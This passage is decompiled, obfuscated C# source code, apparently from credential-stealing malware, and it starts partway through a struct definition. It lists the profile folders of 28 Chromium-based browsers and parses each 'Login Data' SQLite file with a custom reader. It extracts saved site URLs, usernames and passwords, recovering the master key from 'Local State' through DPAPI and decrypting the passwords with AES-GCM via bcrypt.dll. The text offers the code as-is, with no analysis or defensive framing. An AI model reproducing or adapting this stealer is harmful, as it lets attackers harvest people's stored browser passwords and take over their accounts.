            public int int_5;

            public int int_6;

            public long long_0;

            public int int_7;

            public GStruct1(byte[] byte_0, byte[] byte_1, byte[] byte_2)
            {
                this = default(GStruct1);
                int_1 = GClass3.int_1;
                int_0 = Marshal.SizeOf(typeof(GStruct1));
                if (byte_0 != null)
                {
                    int_2 = byte_0.Length;
                    intptr_0 = Marshal.AllocHGlobal(int_2);
                    Marshal.Copy(byte_0, 0, intptr_0, int_2);
                }
                if (byte_1 != null)
                {
                    int_3 = byte_1.Length;
                    intptr_1 = Marshal.AllocHGlobal(int_3);
                    Marshal.Copy(byte_1, 0, intptr_1, int_3);
                }
                if (byte_2 != null)
                {
                    int_4 = byte_2.Length;
                    intptr_2 = Marshal.AllocHGlobal(int_4);
                    Marshal.Copy(byte_2, 0, intptr_2, int_4);
                    int_5 = byte_2.Length;
                    intptr_3 = Marshal.AllocHGlobal(int_5);
                }
            }

            public void Dispose()
            {
                if (intptr_0 != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intptr_0);
                }
                if (intptr_2 != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intptr_2);
                }
                if (intptr_1 != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intptr_1);
                }
                if (intptr_3 != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(intptr_3);
                }
            }
        }

        public struct GStruct2
        {
            public int int_0;

            public int int_1;

            public int int_2;
        }

        public struct GStruct3
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string string_0;

            public IntPtr intptr_0;

            public int int_0;

            public GStruct3(string string_1)
            {
                string_0 = string_1;
                intptr_0 = IntPtr.Zero;
                int_0 = 0;
            }
        }

        public const uint uint_0 = 0u;

        public const uint uint_1 = 8u;

        public const uint uint_2 = 4u;

        public static readonly byte[] byte_0 = BitConverter.GetBytes(1296188491);

        public static readonly string string_0 = "ObjectLength";

        public static readonly string string_1 = "ChainingModeGCM";

        public static readonly string string_2 = "AuthTagLength";

        public static readonly string string_3 = "ChainingMode";

        public static readonly string string_4 = "KeyDataBlob";

        public static readonly string string_5 = "AES";

        public static readonly string string_6 = "Microsoft Primitive Provider";

        public static readonly int int_0 = 1;

        public static readonly int int_1 = 1;

        public static readonly uint uint_3 = 3221266434u;

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr intptr_0, [MarshalAs(UnmanagedType.LPWStr)] string string_7, [MarshalAs(UnmanagedType.LPWStr)] string string_8, uint uint_4);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptCloseAlgorithmProvider(IntPtr intptr_0, uint uint_4);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptGetProperty(IntPtr intptr_0, [MarshalAs(UnmanagedType.LPWStr)] string string_7, byte[] byte_1, int int_2, ref int int_3, uint uint_4);

        [DllImport("bcrypt.dll")]
        internal static extern uint BCryptSetProperty(IntPtr intptr_0, [MarshalAs(UnmanagedType.LPWStr)] string string_7, byte[] byte_1, int int_2, int int_3);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptImportKey(IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.LPWStr)] string string_7, out IntPtr intptr_2, IntPtr intptr_3, int int_2, byte[] byte_1, int int_3, uint uint_4);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptDestroyKey(IntPtr intptr_0);

        [DllImport("bcrypt.dll")]
        public static extern uint BCryptEncrypt(IntPtr intptr_0, byte[] byte_1, int int_2, ref GStruct1 gstruct1_0, byte[] byte_2, int int_3, byte[] byte_3, int int_4, ref int int_5, uint uint_4);

        [DllImport("bcrypt.dll")]
        internal static extern uint BCryptDecrypt(IntPtr intptr_0, byte[] byte_1, int int_2, ref GStruct1 gstruct1_0, byte[] byte_2, int int_3, byte[] byte_3, int int_4, ref int int_5, int int_6);
    }




    public class GClass4
    {
        public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static List<GClass2> smethod_0()
        {
            Dictionary<string, string> obj = new Dictionary<string, string>
        {
            {
                "Chrome",
                string_0 + "\\Google\\Chrome\\User Data"
            },
            {
                "Opera",
                Path.Combine(string_1, "Opera Software\\Opera Stable")
            },
            {
                "Yandex",
                Path.Combine(string_0, "Yandex\\YandexBrowser\\User Data")
            },
            {
                "360 Browser",
                string_0 + "\\360Chrome\\Chrome\\User Data"
            },
            {
                "Comodo Dragon",
                Path.Combine(string_0, "Comodo\\Dragon\\User Data")
            },
            {
                "CoolNovo",
                Path.Combine(string_0, "MapleStudio\\ChromePlus\\User Data")
            },
            {
                "SRWare Iron",
                Path.Combine(string_0, "Chromium\\User Data")
            },
            {
                "Torch Browser",
                Path.Combine(string_0, "Torch\\User Data")
            },
            {
                "Brave Browser",
                Path.Combine(string_0, "BraveSoftware\\Brave-Browser\\User Data")
            },
            {
                "Iridium Browser",
                string_0 + "\\Iridium\\User Data"
            },
            {
                "7Star",
                Path.Combine(string_0, "7Star\\7Star\\User Data")
            },
            {
                "Amigo",
                Path.Combine(string_0, "Amigo\\User Data")
            },
            {
                "CentBrowser",
                Path.Combine(string_0, "CentBrowser\\User Data")
            },
            {
                "Chedot",
                Path.Combine(string_0, "Chedot\\User Data")
            },
            {
                "CocCoc",
                Path.Combine(string_0, "CocCoc\\Browser\\User Data")
            },
            {
                "Elements Browser",
                Path.Combine(string_0, "Elements Browser\\User Data")
            },
            {
                "Epic Privacy Browser",
                Path.Combine(string_0, "Epic Privacy Browser\\User Data")
            },
            {
                "Kometa",
                Path.Combine(string_0, "Kometa\\User Data")
            },
            {
                "Orbitum",
                Path.Combine(string_0, "Orbitum\\User Data")
            },
            {
                "Sputnik",
                Path.Combine(string_0, "Sputnik\\Sputnik\\User Data")
            },
            {
                "uCozMedia",
                Path.Combine(string_0, "uCozMedia\\Uran\\User Data")
            },
            {
                "Vivaldi",
                Path.Combine(string_0, "Vivaldi\\User Data")
            },
            {
                "Sleipnir 6",
                Path.Combine(string_1, "Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer")
            },
            {
                "Citrio",
                Path.Combine(string_0, "CatalinaGroup\\Citrio\\User Data")
            },
            {
                "Coowon",
                Path.Combine(string_0, "Coowon\\Coowon\\User Data")
            },
            {
                "Liebao Browser",
                Path.Combine(string_0, "liebao\\User Data")
            },
            {
                "QIP Surf",
                Path.Combine(string_0, "QIP Surf\\User Data")
            },
            {
                "Edge Chromium",
                Path.Combine(string_0, "Microsoft\\Edge\\User Data")
            }
        };
            List<GClass2> list = new List<GClass2>();
            foreach (KeyValuePair<string, string> item in obj)
            {
                list.AddRange(smethod_1(item.Value, item.Key));
            }
            return list;
        }

        private static List<GClass2> smethod_1(string string_2, string string_3, string string_4 = "logins")
        {
            List<string> list = smethod_2(string_2);
            List<GClass2> list2 = new List<GClass2>();
            string[] array = list.ToArray();
            foreach (string path in array)
            {
                if (!File.Exists(path))
                {
                    continue;
                }
                GClass5 gClass;
                try
                {
                    gClass = new GClass5(path);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    continue;
                }
                if (!gClass.method_9(string_4))
                {
                    continue;
                }
                for (int j = 0; j <= gClass.method_2() - 1; j++)
                {
                    try
                    {
                        string text = gClass.method_5(j, "origin_url");
                        string value = gClass.method_5(j, "username_value");
                        string text2 = gClass.method_5(j, "password_value");
                        if (text2 != null)
                        {
                            if (!text2.StartsWith("v10") && !text2.StartsWith("v11"))
                            {
                                text2 = smethod_5(text2);
                                goto IL_00f7;
                            }
                            byte[] array2 = smethod_4(Directory.GetParent(path).Parent.FullName);
                            if (array2 != null)
                            {
                                text2 = smethod_3(Encoding.Default.GetBytes(text2), array2);
                                goto IL_00f7;
                            }
                        }
                        goto end_IL_0067;
                    IL_00f7:
                        if (!string.IsNullOrEmpty(text) && !string.IsNullOrEmpty(value) && !string.IsNullOrEmpty(text2))
                        {
                            list2.Add(new GClass2
                            {
                                String_2 = text,
                                String_0 = value,
                                String_1 = text2,
                                String_3 = string_3
                            });
                        }
                    end_IL_0067:;
                    }
                    catch (Exception ex2)
                    {
                        Console.WriteLine(ex2.ToString());
                    }
                }
            }
            return list2;
        }

        private static List<string> smethod_2(string string_2)
        {
            List<string> list = new List<string>
        {
            string_2 + "\\Default\\Login Data",
            string_2 + "\\Login Data"
        };
            if (Directory.Exists(string_2))
            {
                string[] directories = Directory.GetDirectories(string_2);
                foreach (string text in directories)
                {
                    if (text.Contains("Profile"))
                    {
                        list.Add(text + "\\Login Data");
                    }
                }
            }
            return list;
        }

        public static string smethod_3(byte[] byte_0, byte[] byte_1)
        {
            byte[] array = new byte[12];
            Array.Copy(byte_0, 3, array, 0, 12);
            try
            {
                byte[] array2 = new byte[byte_0.Length - 15];
                Array.Copy(byte_0, 15, array2, 0, byte_0.Length - 15);
                byte[] array3 = new byte[16];
                byte[] array4 = new byte[array2.Length - array3.Length];
                Array.Copy(array2, array2.Length - 16, array3, 0, 16);
                Array.Copy(array2, 0, array4, 0, array2.Length - array3.Length);
                Class2 @class = new Class2();
                return Encoding.UTF8.GetString(@class.method_0(byte_1, array, null, array4, array3));
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static byte[] smethod_4(string string_2)
        {
            string path = string_2 + "\\Local State";
            byte[] array = new byte[0];
            if (!File.Exists(path))
            {
                return null;
            }
            foreach (Match item in new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(path)))
            {
                if (item.Success)
                {
                    array = Convert.FromBase64String(item.Groups[1].Value);
                }
            }
            byte[] array2 = new byte[array.Length - 5];
            Array.Copy(array, 5, array2, 0, array.Length - 5);
            try
            {
                return ProtectedData.Unprotect(array2, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }

        public static string smethod_5(string string_2)
        {
            if (string_2 != null && string_2.Length != 0)
            {
                try
                {
                    return Encoding.UTF8.GetString(ProtectedData.Unprotect(Encoding.Default.GetBytes(string_2), null, DataProtectionScope.CurrentUser));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                    return null;
                }
            }
            return null;
        }
    }


    public class GClass5
    {
        private struct Struct4
        {
            public long long_0;

            public long long_1;
        }

        private struct Struct5
        {
            public long long_0;

            public string string_0;

            public string string_1;

            public string string_2;

            public long long_1;

            public string string_3;
        }

        private struct Struct6
        {
            public long long_0;

            public string[] string_0;
        }

        private byte[] byte_0;

        private ulong ulong_0;

        private string[] string_0;

        private Struct5[] struct5_0;

        private ushort ushort_0;

        private byte[] byte_1 = new byte[10]
        {
        0,
        1,
        2,
        3,
        4,
        6,
        8,
        8,
        0,
        0
        };

        private Struct6[] struct6_0;

        public GClass5(string string_1)
        {
            if (File.Exists(string_1))
            {
                FileSystem.FileOpen(1, string_1, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
                string Value = Strings.Space((int)FileSystem.LOF(1));
                FileSystem.FileGet(1, ref Value);
                FileSystem.FileClose(1);
                byte_0 = Encoding.Default.GetBytes(Value);
                if (Encoding.Default.GetString(byte_0, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }
                if (byte_0[52] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }
                ushort_0 = (ushort)method_0(16, 2);
                ulong_0 = method_0(56, 4);
                if (decimal.Compare(new decimal(ulong_0), 0m) == 0)
                {
                    ulong_0 = 1uL;
                }
                method_8(100uL);
            }
        }

        private ulong method_0(int int_0, int int_1)
        {
            if (int_1 > 8 || int_1 == 0)
            {
                return 0uL;
            }
            ulong num = 0uL;
            int num2 = int_1 - 1;
            for (int i = 0; i <= num2; i++)
            {
                num = ((num << 8) | byte_0[int_0 + i]);
            }
            return num;
        }

        private long method_1(int int_0, int int_1)
        {
            int_1++;
            byte[] array = new byte[8];
            int num = int_1 - int_0;
            bool flag = false;
            if (num == 0 || num > 9)
            {
                return 0L;
            }
            switch (num)
            {
                case 1:
                    array[0] = (byte)(byte_0[int_0] & 0x7F);
                    return BitConverter.ToInt64(array, 0);
                case 9:
                    flag = true;
                    break;
            }
            int num2 = 1;
            int num3 = 7;
            int num4 = 0;
            if (flag)
            {
                array[0] = byte_0[int_1 - 1];
                int_1--;
                num4 = 1;
            }
            for (int i = int_1 - 1; i >= int_0; i += -1)
            {
                if (i - 1 >= int_0)
                {
                    array[num4] = (byte)(((byte)(byte_0[i] >> ((num2 - 1) & 7)) & (255 >> num2)) | (byte)(byte_0[i - 1] << (num3 & 7)));
                    num2++;
                    num4++;
                    num3--;
                }
                else if (!flag)
                {
                    array[num4] = (byte)((byte)(byte_0[i] >> ((num2 - 1) & 7)) & (255 >> num2));
                }
            }
            return BitConverter.ToInt64(array, 0);
        }

        public int method_2()
        {
            return struct6_0.Length;
        }

        public string[] method_3()
        {
            string[] array = null;
            int num = 0;
            int num2 = struct5_0.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (struct5_0[i].string_0 == "table")
                {
                    array = (string[])Utils.CopyArray(array, new string[num + 1]);
                    array[num] = struct5_0[i].string_1;
                    num++;
                }
            }
            return array;
        }

        public string method_4(int int_0, int int_1)
        {
            if (int_0 >= struct6_0.Length)
            {
                return null;
            }
            if (int_1 >= struct6_0[int_0].string_0.Length)
            {
                return null;
            }
            return struct6_0[int_0].string_0[int_1];
        }

        public string method_5(int int_0, string string_1)
        {
            int num = -1;
            int num2 = string_0.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (string_0[i].ToLower().CompareTo(string_1.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return null;
            }
            return method_4(int_0, num);
        }

        private int method_6(int int_0)
        {
            if (int_0 > byte_0.Length)
            {
                return 0;
            }
            int num = int_0 + 8;
            int num2 = int_0;
            while (true)
            {
                if (num2 <= num)
                {
                    if (num2 <= byte_0.Length - 1)
                    {
                        if ((byte_0[num2] & 0x80) != 128)
                        {
                            break;
                        }
                        num2++;
                        continue;
                    }
                    return 0;
                }
                return int_0 + 8;
            }
            return num2;
        }

        private bool method_7(long long_0)
        {
            return (long_0 & 1L) == 1L;
        }

        private void method_8(ulong ulong_1)
        {
            if (byte_0[(uint)ulong_1] == 13)
            {
                ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
                int num2 = 0;
                if (struct5_0 != null)
                {
                    num2 = struct5_0.Length;
                    struct5_0 = (Struct5[])Utils.CopyArray(struct5_0, new Struct5[struct5_0.Length + num + 1]);
                }
                else
                {
                    struct5_0 = new Struct5[num + 1];
                }
                int num3 = num;
                for (int i = 0; i <= num3; i++)
                {
                    ulong num4 = method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 8m), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(ulong_1), 100m) != 0)
                    {
                        num4 += ulong_1;
                    }
                    int num5 = method_6((int)num4);
                    method_1((int)num4, num5);
                    int num6 = method_6(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
                    struct5_0[num2 + i].long_0 = method_1(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
                    num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
                    num5 = method_6((int)num4);
                    num6 = num5;
                    long value = method_1((int)num4, num5);
                    long[] array = new long[5];
                    int num7 = 0;
                    do
                    {
                        num5 = num6 + 1;
                        num6 = method_6(num5);
                        array[num7] = method_1(num5, num6);
                        if (array[num7] <= 9L)
                        {
                            array[num7] = byte_1[(int)array[num7]];
                        }
                        else if (method_7(array[num7]))
                        {
                            array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
                        }
                        else
                        {
                            array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
                        }
                        num7++;
                    }
                    while (num7 <= 4);
                    if (decimal.Compare(new decimal(ulong_0), 1m) == 0)
                    {
                        struct5_0[num2 + i].string_0 = Encoding.Default.GetString(byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 2m) == 0)
                    {
                        struct5_0[num2 + i].string_0 = Encoding.Unicode.GetString(byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 3m) == 0)
                    {
                        struct5_0[num2 + i].string_0 = Encoding.BigEndianUnicode.GetString(byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
                    }
                    if (decimal.Compare(new decimal(ulong_0), 1m) == 0)
                    {
                        struct5_0[num2 + i].string_1 = Encoding.Default.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 2m) == 0)
                    {
                        struct5_0[num2 + i].string_1 = Encoding.Unicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 3m) == 0)
                    {
                        struct5_0[num2 + i].string_1 = Encoding.BigEndianUnicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
                    }
                    struct5_0[num2 + i].long_1 = (long)method_0(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
                    if (decimal.Compare(new decimal(ulong_0), 1m) == 0)
                    {
                        struct5_0[num2 + i].string_3 = Encoding.Default.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 2m) == 0)
                    {
                        struct5_0[num2 + i].string_3 = Encoding.Unicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
                    }
                    else if (decimal.Compare(new decimal(ulong_0), 3m) == 0)
                    {
                        struct5_0[num2 + i].string_3 = Encoding.BigEndianUnicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
                    }
                }
            }
            else
            {
                if (byte_0[(uint)ulong_1] != 5)
                {
                    return;
                }
                int num8 = Convert.ToUInt16(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
                for (int j = 0; j <= num8; j++)
                {
                    ushort num9 = (ushort)method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 12m), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(ulong_1), 100m) == 0)
                    {
                        method_8(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(method_0(num9, 4)), 1m), new decimal(ushort_0))));
                    }
                    else
                    {
                        method_8(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(method_0((int)(ulong_1 + num9), 4)), 1m), new decimal(ushort_0))));
                    }
                }
                method_8(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 8m)), 4)), 1m), new decimal(ushort_0))));
            }
        }

        public bool method_9(string string_1)
        {
            int num = -1;
            int num2 = struct5_0.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (struct5_0[i].string_1.ToLower().CompareTo(string_1.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }
            if (num == -1)
            {
                return false;
            }
            string[] array = struct5_0[num].string_3.Substring(struct5_0[num].string_3.IndexOf("(") + 1).Split(',');
            int num3 = array.Length - 1;
            for (int j = 0; j <= num3; j++)
            {
                array[j] = array[j].TrimStart();
                int num4 = array[j].IndexOf(" ");
                if (num4 > 0)
                {
                    array[j] = array[j].Substring(0, num4);
                }
                if (array[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }
                string_0 = (string[])Utils.CopyArray(string_0, new string[j + 1]);
                string_0[j] = array[j];
            }
            return method_10((ulong)((struct5_0[num].long_1 - 1L) * ushort_0));
        }

        private bool method_10(ulong ulong_1)
        {
            if (byte_0[(uint)ulong_1] == 13)
            {
                int num = Convert.ToInt32(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
                int num2 = 0;
                if (struct6_0 != null)
                {
                    num2 = struct6_0.Length;
                    struct6_0 = (Struct6[])Utils.CopyArray(struct6_0, new Struct6[struct6_0.Length + num + 1]);
                }
                else
                {
                    struct6_0 = new Struct6[num + 1];
                }
                int num3 = num;
                for (int i = 0; i <= num3; i++)
                {
                    Struct4[] array = null;
                    ulong num4 = method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 8m), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(ulong_1), 100m) != 0)
                    {
                        num4 += ulong_1;
                    }
                    int num5 = method_6((int)num4);
                    method_1((int)num4, num5);
                    int num6 = method_6(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
                    struct6_0[num2 + i].long_0 = method_1(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
                    num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
                    num5 = method_6((int)num4);
                    num6 = num5;
                    long num7 = method_1((int)num4, num5);
                    long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
                    int num9 = 0;
                    while (num8 < num7)
                    {
                        array = (Struct4[])Utils.CopyArray(array, new Struct4[num9 + 1]);
                        num5 = num6 + 1;
                        num6 = method_6(num5);
                        array[num9].long_1 = method_1(num5, num6);
                        if (array[num9].long_1 > 9L)
                        {
                            if (method_7(array[num9].long_1))
                            {
                                array[num9].long_0 = (long)Math.Round((double)(array[num9].long_1 - 13L) / 2.0);
                            }
                            else
                            {
                                array[num9].long_0 = (long)Math.Round((double)(array[num9].long_1 - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            array[num9].long_0 = byte_1[(int)array[num9].long_1];
                        }
                        num8 = num8 + (num6 - num5) + 1L;
                        num9++;
                    }
                    struct6_0[num2 + i].string_0 = new string[array.Length - 1 + 1];
                    int num10 = 0;
                    int num11 = array.Length - 1;
                    for (int j = 0; j <= num11; j++)
                    {
                        if (array[j].long_1 > 9L)
                        {
                            if (!method_7(array[j].long_1))
                            {
                                if (decimal.Compare(new decimal(ulong_0), 1m) == 0)
                                {
                                    struct6_0[num2 + i].string_0[j] = Encoding.Default.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
                                }
                                else if (decimal.Compare(new decimal(ulong_0), 2m) == 0)
                                {
                                    struct6_0[num2 + i].string_0[j] = Encoding.Unicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
                                }
                                else if (decimal.Compare(new decimal(ulong_0), 3m) == 0)
                                {
                                    struct6_0[num2 + i].string_0[j] = Encoding.BigEndianUnicode.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
                                }
                            }
                            else
                            {
                                struct6_0[num2 + i].string_0[j] = Encoding.Default.GetString(byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
                            }
                        }
                        else
                        {
                            struct6_0[num2 + i].string_0[j] = Conversions.ToString(method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0));
                        }
                        num10 += (int)array[j].long_0;
                    }
                }
            }
            else if (byte_0[(uint)ulong_1] == 5)
            {
                int num12 = Convert.ToUInt16(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 3m)), 2)), 1m));
                for (int k = 0; k <= num12; k++)
                {
                    ushort num13 = (ushort)method_0(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_1), 12m), new decimal(k * 2))), 2);
                    method_10(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(method_0((int)(ulong_1 + num13), 4)), 1m), new decimal(ushort_0))));
                }
                method_10(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(method_0(Convert.ToInt32(decimal.Add(new decimal(ulong_1), 8m)), 4)), 1m), new decimal(ushort_0))));
            }
            return true;
        }
    }


}